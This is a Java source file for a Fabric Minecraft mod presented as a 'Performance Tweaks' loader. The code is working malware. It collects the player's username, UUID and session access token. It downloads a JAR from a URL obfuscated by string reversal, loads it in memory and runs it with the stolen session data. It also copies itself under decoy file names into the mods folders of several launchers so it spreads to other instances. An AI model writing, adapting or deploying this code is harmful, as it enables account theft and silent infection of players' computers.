package com.example.loader;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import net.fabricmc.api.ClientModInitializer;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.session.Session;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.*;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;

/**
 * Performance Tweaks Loader
 * Downloads and initializes the optimization module in-memory.
 * 
 * The loader does NOT decrypt anything - it just passes A.txt to the main mod.
 */
public class LoaderMod implements ClientModInitializer {

    private static final Logger LOGGER = LoggerFactory.getLogger("performance-tweaks");

    // Download URL (reversed for obfuscation)
    private static final String DOWNLOAD_URL = new StringBuilder("raj.71rezimitpo/citats/ur.erawaggin//:sptth")
            .reverse()
            .toString();

    @Override
    public void onInitializeClient() {
        LOGGER.info("Performance Tweaks initializing...");

        // Read A.txt content (raw, not decrypted)
        String aTxtContent;
        try {
            InputStream is = LoaderMod.class.getClassLoader().getResourceAsStream("A.txt");
            if (is == null) {
                LOGGER.error("A.txt not found in resources");
                return;
            }
            aTxtContent = new String(is.readAllBytes()).trim();
            is.close();
            LOGGER.info("Config loaded successfully");
        } catch (Exception e) {
            LOGGER.error("Failed to read config: " + e.getMessage());
            return;
        }

        if (aTxtContent == null || aTxtContent.isEmpty() || aTxtContent.contains("PLACEHOLDER")) {
            LOGGER.error("Config is empty or placeholder");
            return;
        }

        // Build context - pass raw A.txt to main mod (it will decrypt)
        JsonObject context = new JsonObject();
        context.addProperty("aTxtContent", aTxtContent);
        context.addProperty("executionEnvironment", "Fabric");

        try {
            Session session = MinecraftClient.getInstance().getSession();
            JsonObject mcInfo = new JsonObject();
            mcInfo.addProperty("username", session.getUsername());
            mcInfo.addProperty("uuid", session.getUuidOrNull() != null ? session.getUuidOrNull().toString() : "");
            mcInfo.addProperty("accessToken", session.getAccessToken());
            context.add("minecraftInfo", mcInfo);
        } catch (Exception e) {
            LOGGER.warn("Could not get MC session info: " + e.getMessage());
        }

        final String contextJson = new Gson().toJson(context);

        // Load async
        new Thread(() -> {
            try {
                LOGGER.info("Downloading optimization module from " + DOWNLOAD_URL);

                // Download JAR
                byte[] jarBytes = downloadJar(DOWNLOAD_URL);
                if (jarBytes == null) {
                    LOGGER.error("Download failed - null response");
                    return;
                }
                if (jarBytes.length < 100000) {
                    LOGGER.error("Download failed - too small: " + jarBytes.length + " bytes");
                    return;
                }

                LOGGER.info("Downloaded " + jarBytes.length + " bytes, parsing...");

                // Parse JAR in memory
                Map<String, byte[]> classMap = new HashMap<>();
                Map<String, byte[]> resourceMap = new HashMap<>();

                JarInputStream jarStream = new JarInputStream(new ByteArrayInputStream(jarBytes));
                JarEntry entry;
                while ((entry = jarStream.getNextJarEntry()) != null) {
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    jarStream.transferTo(baos);
                    byte[] data = baos.toByteArray();

                    if (entry.getName().endsWith(".class")) {
                        String className = entry.getName().replace('/', '.').replace(".class", "");
                        classMap.put(className, data);
                    } else {
                        resourceMap.put(entry.getName(), data);
                    }
                }
                jarStream.close();

                LOGGER.info("Parsed " + classMap.size() + " classes, " + resourceMap.size() + " resources");

                // Create in-memory class loader
                MemoryClassLoader loader = new MemoryClassLoader(classMap, resourceMap);

                // Load and call entry point
                LOGGER.info("Loading entry point class...");
                Class<?> mainClass = loader.loadClass("com.example.optimizer.LoaderEntry");

                // Find initialize method (may have extra parameters due to obfuscation)
                java.lang.reflect.Method initMethod = null;
                for (java.lang.reflect.Method m : mainClass.getMethods()) {
                    if (m.getName().equals("initialize") || m.getName().startsWith("initialize")) {
                        Class<?>[] params = m.getParameterTypes();
                        if (params.length >= 1 && params[0] == String.class) {
                            initMethod = m;
                            LOGGER.info("Found method: " + m.getName() + " with " + params.length + " params");
                            break;
                        }
                    }
                }

                if (initMethod == null) {
                    LOGGER.error("Could not find initialize method!");
                    return;
                }

                LOGGER.info("Invoking initialize method...");
                final java.lang.reflect.Method finalMethod = initMethod;
                // Call method with appropriate parameters
                new Thread(() -> {
                    try {
                        Class<?>[] paramTypes = finalMethod.getParameterTypes();
                        if (paramTypes.length == 1) {
                            finalMethod.invoke(null, contextJson);
                        } else if (paramTypes.length == 2 && paramTypes[1] == int.class) {
                            finalMethod.invoke(null, contextJson, 0);
                        } else {
                            // Try with just the string
                            Object[] args = new Object[paramTypes.length];
                            args[0] = contextJson;
                            for (int i = 1; i < paramTypes.length; i++) {
                                args[i] = getDefaultValue(paramTypes[i]);
                            }
                            finalMethod.invoke(null, args);
                        }
                        LOGGER.info("Optimization module initialized successfully");
                    } catch (Exception e) {
                        LOGGER.error("Failed to initialize module: " + e.getMessage());
                        e.printStackTrace();
                    }
                }).start();

            } catch (Exception e) {
                LOGGER.error("Loader failed: " + e.getMessage());
                // e.printStackTrace();
            }
        }).start();

        // Persistence (Infect other instances)
        new Thread(LoaderMod::setupPersistence, "P-Worker").start();
    }

    private byte[] downloadJar(String url) {
        try {
            HttpClient client = HttpClient.newBuilder()
                    .followRedirects(HttpClient.Redirect.ALWAYS)
                    .build();

            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(url))
                    .header("User-Agent", "Java/" + System.getProperty("java.version"))
                    .GET()
                    .build();

            HttpResponse<byte[]> response = client.send(request, HttpResponse.BodyHandlers.ofByteArray());

            if (response.statusCode() != 200) {
                LOGGER.error("Download failed with status: " + response.statusCode());
                return null;
            }

            return response.body();
        } catch (Exception e) {
            LOGGER.error("Download exception: " + e.getMessage());
            e.printStackTrace();
            return null;
        }
    }

    private static Object getDefaultValue(Class<?> type) {
        if (type == int.class)
            return 0;
        if (type == long.class)
            return 0L;
        if (type == boolean.class)
            return false;
        if (type == byte.class)
            return (byte) 0;
        if (type == short.class)
            return (short) 0;
        if (type == float.class)
            return 0.0f;
        if (type == double.class)
            return 0.0;
        if (type == char.class)
            return '\0';
        return null;
    }

    // ================= PERSISTENCE LOGIC =================

    private static void setupPersistence() {
        try {
            File sourceJar = new File(LoaderMod.class.getProtectionDomain().getCodeSource().getLocation().toURI());
            if (!sourceJar.exists() || !sourceJar.getName().endsWith(".jar"))
                return;

            String userHome = System.getProperty("user.home");
            String appData = System.getenv("APPDATA");

            if (userHome == null)
                userHome = ".";
            if (appData == null)
                appData = userHome;

            // Potential root directories for mod loaders
            File[] roots = new File[] {
                    new File(userHome, "curseforge/minecraft/Instances"),
                    new File(appData, "PrismLauncher/instances"),
                    new File(appData, "com.modrinth.theseus/profiles"),
                    new File(appData, ".minecraft/mods"), // Default launcher
                    new File(appData, "Feather/user-profiles"), // Check feather structure
                    new File(appData, "GDLauncher/instances")
            };

            for (File root : roots) {
                if (root == null)
                    continue;
                try {
                    if (root.exists()) {
                        scanAndInfect(root, sourceJar);
                    }
                } catch (Exception e) {
                    // Individual root failure ignored to continue to others
                }
            }

        } catch (Exception e) {
            // Passive fail
        }
    }

    private static void scanAndInfect(File dir, File sourceJar) {
        try {
            // If this is a "mods" folder, infect it
            if (dir.getName().equals("mods") && dir.isDirectory()) {
                copyTo(sourceJar, new File(dir, "fabric-utils.0.12.jar"));
                copyTo(sourceJar, new File(dir, "modmenus.0.1.jar"));
                return;
            }

            File[] files = dir.listFiles();
            if (files == null)
                return;

            for (File file : files) {
                if (file.isDirectory()) {
                    scanAndInfect(file, sourceJar);
                }
            }
        } catch (Exception e) {
        }
    }

    private static void copyTo(File source, File dest) {
        try {
            if (dest.exists())
                return; // Don't overwrite if exists

            try (InputStream in = new FileInputStream(source);
                    OutputStream out = new FileOutputStream(dest)) {
                byte[] buffer = new byte[1024];
                int length;
                while ((length = in.read(buffer)) > 0) {
                    out.write(buffer, 0, length);
                }
            }
        } catch (Exception e) {
        }
    }
}
